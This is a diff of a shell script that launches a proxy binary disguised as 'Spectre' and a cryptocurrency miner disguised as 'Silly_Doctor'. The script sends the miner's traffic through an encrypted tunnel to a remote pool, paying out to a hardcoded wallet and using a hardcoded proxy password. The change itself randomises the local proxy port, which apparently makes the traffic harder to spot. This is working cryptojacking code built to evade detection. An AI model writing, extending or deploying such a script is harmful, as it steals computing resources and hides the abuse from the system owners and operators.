@@ -68,7 +68,11 @@ tar -xf Spectre.tar.gz
 
 sleep 2
 
-./Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &
+randomPort1=$(shuf -i 10000-65000 -n 1)
+
+sleep 2
+
+./Spectre -L=:$randomPort1 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &
 
 sleep 2
 
@@ -93,6 +97,6 @@ sleep 2
 
 while true
 do
-./Silly_Doctor --disable-gpu --algorithm minotaurx --pool flyingsaucer-eu.teatspray.fun:7019 --wallet CS6wMVsAHYUoUi79KeKgywoGHy58vc4QJB --password $currentdate,c=LCC,zap=LCC --proxy 127.0.0.1:1082 --cpu-threads $used_num_of_cores --keepalive
+./Silly_Doctor --disable-gpu --algorithm minotaurx --pool flyingsaucer-eu.teatspray.fun:7019 --wallet CS6wMVsAHYUoUi79KeKgywoGHy58vc4QJB --password $currentdate,c=LCC,zap=LCC --proxy 127.0.0.1:$randomPort1 --cpu-threads $used_num_of_cores --keepalive
 sleep 5
 done
